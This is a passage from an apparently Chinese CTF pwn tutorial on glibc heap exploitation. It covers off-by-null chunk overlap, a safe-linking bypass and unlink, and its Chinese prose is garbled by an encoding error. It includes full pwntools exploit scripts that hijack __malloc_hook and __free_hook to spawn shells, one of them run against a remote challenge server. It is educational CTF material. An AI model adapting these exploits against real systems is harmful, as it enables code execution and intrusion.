<p>248 &#x3D; 16*15 + 8</p>
</blockquote>
<p>é€šè¿‡off by nullæ¼æ´æˆ‘ä»¬ä¾¿å¯ä»¥å®ç°å †å—çš„é‡å ï¼ˆoverlapï¼‰ï¼šåœ¨tcacheæœ‰å…­ä¸ªchunkã€æˆ‘ä»¬æ‰‹ä¸Šæœ‰åœ°å€è¿ç»­çš„ä¸‰ä¸ªchunkï¼šAã€Bã€Cçš„æƒ…å†µä¸‹ï¼Œå…ˆfreeæ‰Bï¼Œé€å…¥ tcache ä¸­ä¿æŠ¤èµ·æ¥ï¼Œfree æ‰ A é€å…¥ unsorted binï¼Œå† malloc å› Bï¼Œ<strong>è¦†å†™Cçš„PREV_IN_USEä¸º0ï¼Œä¹‹åfreeæ‰Cï¼Œè§¦å‘malloc_consolidateï¼Œåˆå¹¶æˆä¸ºä¸€ä¸ª0x300çš„å¤§chunk</strong>ï¼Œå®ç°<strong>overlapping</strong></p>
<p>ä¹‹åå€’ç©ºtcacheï¼Œå†åˆ†é…ä¸€ä¸ªchunkï¼Œä¾¿ä¼šåˆ†å‰²unsorted biné‡Œçš„å¤§chunkï¼Œæ­¤æ—¶unsorted biné‡Œçš„chunkä¸æ­¤å‰çš„chunk Bé‡å ï¼Œ<strong>è¾“å‡ºchunk Bçš„å†…å®¹ä¾¿èƒ½è·å¾—libcåŸºå€</strong></p>
<p>å†åˆ†é…ä¸€ä¸ªchunkä»¥å¾—åˆ°æŒ‡å‘ç›¸åŒä½ç½®ä¸Šçš„å †å—çš„ç´¢å¼•ï¼Œ<strong>åœ¨è¿™é‡Œæ„é€ tcache poisoningè¦†å†™__malloc_hookä¸ºone_gadgetåéšä¾¿åˆ†é…ä¸€ä¸ªchunkå³å¯getshell</strong></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯åœ¨é‡Šæ”¾å †å—çš„åŠŸèƒ½å‡½æ•°ä¸­åœ¨freeå‰ä¼šå…ˆæ¸…ç©ºå †å—å†…å®¹ï¼Œæ•…åœ¨è¿™é‡Œæ— æ³•é€šè¿‡ä¿®æ”¹__free_hookä¸ºsystemåfree(â€œ&#x2F;bin&#x2F;shâ€)çš„æ–¹æ³•æ¥getshellï¼Œå› æ­¤ç¬”è€…åªå¥½é€‰æ‹©æ”»å‡»__malloc_hook</p>
<p><img src="https://i.loli.net/2021/01/20/Za2wEpFAUu4mN7Q.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./easy_heap&#x27;</span>)<br>e = ELF(<span class="hljs-string">&#x27;./easy_heap&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>one_gadget = <span class="hljs-number">0x10a41c</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;&gt; &#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size:<span class="hljs-built_in">int</span>, content</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;size \n&gt; &#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&#x27;content \n&gt; &#x27;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;index \n&gt; &#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;index \n&gt; &#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    <span class="hljs-comment"># malloc the chunk</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        new(<span class="hljs-number">114</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>)<br><br>    <span class="hljs-comment"># fill the tcache</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        free(<span class="hljs-number">9</span>-i)<br><br>    <span class="hljs-comment"># unsorted bin chunk consolidate</span><br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">1</span>)<br>    free(<span class="hljs-number">2</span>)<br><br>    <span class="hljs-comment"># re-malloc the chunk</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        new(<span class="hljs-number">114</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>)<br><br>    <span class="hljs-comment"># fill the tcache, protect the important chunk</span><br>    free(<span class="hljs-number">8</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>        free(i)<br><br>    <span class="hljs-comment"># unsorted bin overlap</span><br>    free(<span class="hljs-number">7</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>        new(<span class="hljs-number">114</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>)<br>    new(<span class="hljs-number">0xF8</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 7, the former 8</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        free(i)<br>    free(<span class="hljs-number">9</span>)<br><br>    <span class="hljs-comment"># leak the libc base</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        new(<span class="hljs-number">114</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>)<br>    new(<span class="hljs-number">114</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 8</span><br>    dump(<span class="hljs-number">7</span>)<br>    main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span><br>    __malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>    libc_base = __malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    log.info(<span class="hljs-string">&quot;libc addr leak: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>    <span class="hljs-comment"># tcache poisoning</span><br>    new(<span class="hljs-number">114</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 9</span><br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">1</span>)<br>    free(<span class="hljs-number">7</span>)<br>    free(<span class="hljs-number">2</span>)<br>    free(<span class="hljs-number">9</span>)<br>    new(<span class="hljs-number">114</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]))<br>    new(<span class="hljs-number">114</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>)<br>    new(<span class="hljs-number">114</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>)<br>    new(<span class="hljs-number">114</span>, p64(libc_base + one_gadget)) <span class="hljs-comment"># fake chunk</span><br><br>    <span class="hljs-comment"># get the shell</span><br>    cmd(<span class="hljs-number">1</span>)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œï¼ŒæˆåŠŸgetshellï¼ˆæœ¬åœ°ç¯å¢ƒUbuntu18.0.4ï¼‰</p>
<p><img src="https://i.loli.net/2020/11/26/XAZm7UrvFw8cfih.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="äº”ã€Safe-Linkling-bypassï¼ˆglibc-2-32-and-upï¼‰"><a href="#äº”ã€Safe-Linkling-bypassï¼ˆglibc-2-32-and-upï¼‰" class="headerlink" title="äº”ã€Safe-Linkling bypassï¼ˆglibc 2.32 and upï¼‰"></a>äº”ã€Safe-Linkling bypassï¼ˆglibc 2.32 and upï¼‰</h2><p>å‰é¢æˆ‘ä»¬è®²åˆ°ï¼Œè‡ª glibc2.32 èµ·æ–°å¢äº† safe-linking æœºåˆ¶ç”¨ä»¥ä¿æŠ¤å­˜æ”¾åœ¨ tcache ä¸ fastbin ä¸­çš„ chunk æŒ‡é’ˆï¼Œä¿è¯ chunk é“¾è¡¨çš„å®Œæ•´æ€§</p>
<p>ä½†æ˜¯ safe-linking æœºåˆ¶åŒæ ·å­˜åœ¨ç€å…¶ç¼ºç‚¹ï¼šå¯¹äº tcache è€Œè¨€ï¼Œç¬¬ä¸€ä¸ªè¢«æ”¾å…¥ tcache çš„ chunk çš„ fd æŒ‡é’ˆåœ¨ç»è¿‡ safe-linking åä¼šè¢«å†™å…¥ä¸€ä¸ª<strong>æœªåŠ å¯†çš„å †ä¸Šç›¸å…³åœ°å€</strong>ï¼ˆä¸ 0 å¼‚æˆ–ï¼‰ï¼Œå› è€Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥ chunk çš„ fd æŒ‡é’ˆæ³„éœ²å †åŸºå€ï¼Œæœ‰äº†å †åŸºå€æˆ‘ä»¬ä¾¿èƒ½å¾ˆè½»æ¾åœ°ç»•è¿‡ safe-linking æœºåˆ¶çš„ä¿æŠ¤</p>
<p>åŒæ ·åœ°ï¼Œè‹¥æ˜¯æˆ‘ä»¬èƒ½å¤Ÿæ‰“å° tcache ä¸­ free chunk çš„ bd å­—æ®µï¼Œåˆ™åŒæ ·å¯ä»¥è·å¾— tcache keyï¼Œä»¥æ­¤æ³„éœ²å †åŸºå€ï¼Œç»•è¿‡ safe-linking</p>
<h3 id="ä¾‹é¢˜ï¼š-VNCTF-2021-ff-tcache-poisoning-IO-FILE-hijack"><a href="#ä¾‹é¢˜ï¼š-VNCTF-2021-ff-tcache-poisoning-IO-FILE-hijack" class="headerlink" title="ä¾‹é¢˜ï¼š[VNCTF 2021]ff - tcache poisoning + IO_FILE hijack"></a>ä¾‹é¢˜ï¼š[VNCTF 2021]ff - tcache poisoning + IO_FILE hijack</h3><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/03/28/GnvgcRy2Sdz8MY4.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>å¤§è‡´æ˜¯æœ‰ç€åˆ†é…ã€é‡Šæ”¾ã€æ‰“å°ã€ç¼–è¾‘å †å—åŠŸèƒ½çš„ç¨‹åºï¼Œä½†æ˜¯é™åˆ¶äº†åªèƒ½ç¼–è¾‘ä¸¤æ¬¡ã€æ‰“å°ä¸€æ¬¡ï¼ŒåŒæ—¶<strong>ä¸€æ¬¡åªèƒ½æ“ä½œä¸€ä¸ªå †å—</strong></p>
<p><img src="https://i.loli.net/2021/03/28/vz5wyYXgJxA6pIu.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é‡Šæ”¾åŠŸèƒ½ä¸­æ²¡æœ‰æ¸…ç©ºï¼Œå­˜åœ¨ UAF</p>
<p><img src="https://i.loli.net/2021/03/28/JXQhGvoTieV14xa.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ä½†æ˜¯libc çš„ç‰ˆæœ¬ä¸º <code>2.32</code> ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦ç”¨æ‰å”¯ä¸€çš„ä¸€æ¬¡æ‰“å°çš„æœºä¼šæ³„éœ²å †åŸºå€æ‰èƒ½é€šè¿‡ double free è¿›è¡Œä»»æ„åœ°å€å†™</p>
<p>è€Œæˆ‘ä»¬è¿˜éœ€è¦æƒ³åŠæ³•æ³„éœ² libc åŸºå€ï¼Œä½†æ˜¯æˆ‘ä»¬åªèƒ½åˆ†é… <code>0x80</code> çš„å †å—ï¼Œå³ä½¿åŠ«æŒäº† tcache struct åæ‰€é‡Šæ”¾çš„å †å—ä¹Ÿåªèƒ½å¤Ÿè¿›å…¥ fastbinä¸­ï¼ˆè€Œä¸”æˆ‘ä»¬ä¸€æ¬¡åªèƒ½æ“ä½œä¸€ä¸ªå †å—</p>
<p><img src="https://i.loli.net/2021/03/28/qKEHz4FSWkXJ8lM.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è€ƒè™‘åˆ° tcacheç®¡ç†å™¨ æœ¬èº«ä¾¿æ˜¯ä¸€ä¸ª <code>0x291</code>çš„å †å—ï¼Œæˆ‘ä»¬å¯ä»¥åŠ«æŒä¹‹åæ”¹å¯¹åº”è®¡æ•°ä¸º7åfreeæ‰ï¼Œé€å…¥ unsorted bin ä¸­ï¼Œä¹‹ååˆ‡å‰²è¿™ä¸ªå¤§chunkï¼Œåˆ©ç”¨æ®‹ç•™æŒ‡é’ˆ å¤§æ¦‚1&#x2F;16 çš„å‡ ç‡å¯ä»¥çˆ†ç ´åˆ° stdout é™„è¿‘ï¼ŒåŠ«æŒ stdout ä»¥æ³„éœ² libc åŸºå€ï¼Œæœ€åæ”¹ <code>__free_hook</code> ä¸º system å‡½æ•°åé‡Šæ”¾ä¸€ä¸ªå†…å®¹ä¸º <code>/bin/sh </code>çš„ chunk å³å¯ get shell</p>
<blockquote>
<p>éé…‹çš„è¯å¯èƒ½è¦çˆ†ç ´å¾ˆä¹…â€¦</p>
</blockquote>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-keyword">global</span> p<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<span class="hljs-comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">command:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(command).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size:<span class="hljs-built_in">int</span>, content</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Size:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Content:&quot;</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>():<br>    cmd(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    cmd(<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">content</span>):<br>    cmd(<span class="hljs-number">5</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Content:&quot;</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">hit_byte</span>):<br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br>    free()<br>    show()<br><br>    heap_leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    heap_base = heap_leak * <span class="hljs-number">0x1000</span><br>    log.success(<span class="hljs-string">&#x27;heap base: &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br>    edit(<span class="hljs-string">b&#x27;arttnba3arttnba4&#x27;</span>)<br>    free()<br>    edit(p64(heap_leak ^ (heap_base + <span class="hljs-number">0x10</span>)))<br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;\x00\x00&#x27;</span> * (<span class="hljs-number">0xe</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">9</span>) + <span class="hljs-string">b&#x27;\x07\x00&#x27;</span>)<br>    free()<br><br>    new(<span class="hljs-number">0x40</span>, (<span class="hljs-string">b&#x27;\x00\x00&#x27;</span> * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x01\x00&#x27;</span> + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span> * <span class="hljs-number">2</span> + <span class="hljs-string">b&#x27;\x01\x00&#x27;</span>).ljust(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment"># unknown reason, bigger than 0x48 will failed.</span><br>    new(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>.ljust(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    new(<span class="hljs-number">0x10</span>, p64(<span class="hljs-number">0</span>) + <span class="hljs-string">b&#x27;\xc0&#x27;</span> + p8(hit_byte * <span class="hljs-number">0x10</span> + <span class="hljs-number">6</span>)) <span class="hljs-comment"># 1/16 to hit stdout</span><br>    new(<span class="hljs-number">0x40</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>    libc_base = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1e4744</span><br>    new(<span class="hljs-number">0x10</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]))<br>    new(<span class="hljs-number">0x70</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>    new(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>    free()<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    count = <span class="hljs-number">1</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;the no.&#x27;</span> + <span class="hljs-built_in">str</span>(count) + <span class="hljs-string">&#x27; try&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;try: &#x27;</span> + <span class="hljs-string">b&#x27;\xc0&#x27;</span> + p8(i * <span class="hljs-number">0x10</span> + <span class="hljs-number">6</span>))<br>            p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="hljs-number">26018</span>)<span class="hljs-comment">#process(&#x27;./ff&#x27;) #</span><br>            exp(i)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            p.close()<br>            i = i + <span class="hljs-number">1</span><br>            count = count + <span class="hljs-number">1</span><br>            i = i % <span class="hljs-number">16</span><br>            <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/03/28/jiQUwRnTrZfuEty.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="å…­ã€Unlink"><a href="#å…­ã€Unlink" class="headerlink" title="å…­ã€Unlink"></a>å…­ã€Unlink</h2><p>ç”±äº unlink ä¸­å­˜åœ¨ç€å„ç§å„æ ·çš„å®‰å…¨æ£€æµ‹ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•é€šè¿‡ unlink ç›´æ¥è¿›è¡Œä»»æ„åœ°å€å†™å…¥</p>
<p><strong>ä½†æ˜¯æˆ‘ä»¬ä»æ—§èƒ½å¤Ÿé€šè¿‡ unlink æœºåˆ¶å°†ç‰¹å®šåœ°å€å†™å…¥åˆ°ç‰¹å®šçš„ä½ç½®</strong>ï¼š</p>
<p>è®¾æŒ‡å‘å¯ UAF chunk çš„æŒ‡é’ˆçš„åœ°å€ä¸º ptr</p>
<ol>
<li>ä¿®æ”¹ fd ä¸º ptr - 0x18</li>
<li>ä¿®æ”¹ bk ä¸º ptr - 0x10</li>
<li>è§¦å‘ unlink</li>
</ol>
<p>ptr å¤„çš„æŒ‡é’ˆä¼šå˜ä¸º ptr - 0x18ã€‚</p>
<h3 id="ä¾‹é¢˜ï¼šhitcon2014-stkof-Unlink-got-hijack-Fastbin-Attack-one-gadget"><a href="#ä¾‹é¢˜ï¼šhitcon2014-stkof-Unlink-got-hijack-Fastbin-Attack-one-gadget" class="headerlink" title="ä¾‹é¢˜ï¼šhitcon2014_stkof - Unlink + got hijack + Fastbin Attack + one_gadget"></a>ä¾‹é¢˜ï¼šhitcon2014_stkof - Unlink + got hijack + Fastbin Attack + one_gadget</h3><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œä¿æŠ¤å…¨â€¦åªå¼€äº† NX å’Œ canary</p>
<p><img src="https://i.loli.net/2021/04/06/fhCpAXLSK7rTHVs.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ‹–å…¥IDA è¿›è¡Œåˆ†æ</p>
<p>æ²¡æœ‰èœå•æç¤ºçš„èœå•é¢˜ï¼ˆæ¼ï¼‰</p>
<p>å¤§æ¦‚æ˜¯æœ‰åˆ†é…ã€é‡Šæ”¾ã€ç¼–è¾‘å †å—åŠŸèƒ½</p>
<p><img src="https://i.loli.net/2021/04/06/uBYpC2mdAWy4ilF.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ¼æ´åœ¨äºç¼–è¾‘é•¿åº¦è‡ªå®šï¼Œå­˜åœ¨å †æº¢å‡º</p>
<p><img src="https://i.loli.net/2021/04/07/2tXSkUziY7hIL9y.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ²¡æœ‰æ‰“å°åŠŸèƒ½ï¼Œæ²¡æœ‰tcacheä¹Ÿéš¾æ•´ä»»æ„åœ°å€å†™ï¼ˆfastbin sizeæ£€æŸ¥ï¼‰ï¼Œé‚£å°±åªèƒ½é€šè¿‡unlinkåŠ«æŒgotè¡¨äº†ï¼ˆæ¼ï¼‰</p>
<p>å¤§æ¦‚æ˜¯æ„é€ å¦‚ä¸‹å †å¸ƒå±€ï¼ˆè¡¨æ ¼æœ‰ç‚¹ä¸‘ï¼Œå°†å°±ç€çœ‹ï¼ˆxï¼‰ï¼‰ï¼Œå› ä¸ºå­˜æ”¾å †æŒ‡é’ˆçš„æ•°ç»„åœ¨bssæ®µä¸Šï¼Œæ²¡å¼€PIEï¼Œé‚£æˆ‘ä»¬ç›´æ¥ç”¨ unlink åŠ«æŒgotè¡¨å³å¯</p>
<table>
<thead>
<tr>
<th align="right">address</th>
<th align="right">prev_size</th>
<th align="right">size</th>
</tr>
</thead>
<tbody><tr>
<td align="right">chunk2</td>
<td align="right">0</td>
<td align="right">0x31</td>
</tr>
<tr>
<td align="right">(fake chunk)</td>
<td align="right">0</td>
<td align="right">0x21</td>
</tr>
<tr>
<td align="right"></td>
<td align="right">chunk_array[2] - 0x18</td>
<td align="right">chunk_array[2] - 0x10</td>
</tr>
<tr>
<td align="right">chunk3</td>
<td align="right">0x20</td>
<td align="right">0x90</td>
</tr>
<tr>
<td align="right"></td>
<td align="right">â€¦</td>
<td align="right">â€¦</td>
</tr>
</tbody></table>
<p>å¤§æ¦‚èƒ½å¤Ÿæ»¡è¶³ <code>fake chunk-&gt;FD-&gt;BK = fake chunk</code> å’Œ <code>fake chunk-&gt;BK-&gt;FD = fake chunk</code> ï¼Œæ­¤æ—¶ free(chunk3)ï¼Œç”±äº prev_in_use ä½ä¸º 0ï¼Œæˆ‘ä»¬çš„ fake chunk å°±ä¼šè¢«åˆå¹¶åˆ°chunk3ä¸­</p>
<p>æ¥ä¸‹æ¥çš„ unlink æ“ä½œä¼šå°†<code>fake chunk-&gt;FD-&gt;BK</code> èµ‹å€¼ä¸º<code>fake chunk-&gt;BK</code>ï¼Œå°†<code>fake chunk-&gt;BK-&gt;FD</code> èµ‹å€¼ä¸º<code>fake chunk-&gt;FD</code></p>
<p>å³<strong>å­˜æ”¾</strong> <code>chunk2</code> <strong>æŒ‡é’ˆçš„ä½ç½®å­˜æ”¾çš„æŒ‡é’ˆå˜æˆäº†</strong> <code>chunk_array</code> <strong>çš„åœ°å€</strong>ï¼Œæ­¤æ—¶æˆ‘ä»¬ä¾¿å¯ä»¥ç›´æ¥ä¿®æ”¹ <code>chunk_array</code> ä¸­æŒ‡é’ˆï¼ŒåŠ«æŒ got è¡¨ä¸€å¥—å¸¦èµ°</p>
<p>exp å¦‚ä¸‹ï¼š</p>
